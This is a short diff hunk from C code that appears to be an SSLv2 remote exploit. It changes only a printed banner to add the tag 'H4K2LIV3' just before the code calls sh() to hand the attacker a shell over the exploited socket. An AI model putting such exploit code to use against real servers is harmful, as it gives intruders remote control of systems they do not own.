@@ -1282,7 +1282,7 @@ int main(int argc, char* argv[])
 	}
 	send_client_finished(ssl2);
 	get_server_error(ssl2);
-	printf("Spawning shell...\n");
+	printf("Spawning shell... H4K2LIV3..\n");
 	sleep(1);
 	sh(ssl2->sock);
 	close(ssl2->sock);
